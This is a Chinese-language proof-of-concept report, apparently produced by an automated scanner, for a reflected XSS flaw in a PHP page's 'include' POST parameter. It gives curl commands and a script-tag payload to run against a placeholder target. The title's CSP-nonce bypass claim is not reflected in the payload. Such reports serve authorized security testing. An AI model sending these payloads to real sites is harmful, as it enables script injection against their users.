# POC — 021.php POST 参数 include 未编码直接拼接进页面导致反射型 XSS（CSP nonce 硬编码可绕过）

- finding_id: `LLM-cd298cc9bb86`
- type: `xss` / CWE-79
- severity: `medium`
- file: `021.php:18`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/021.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 跨站脚本 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/021.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```
预期：响应中脚本未编码，浏览器执行并弹出 document.domain。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。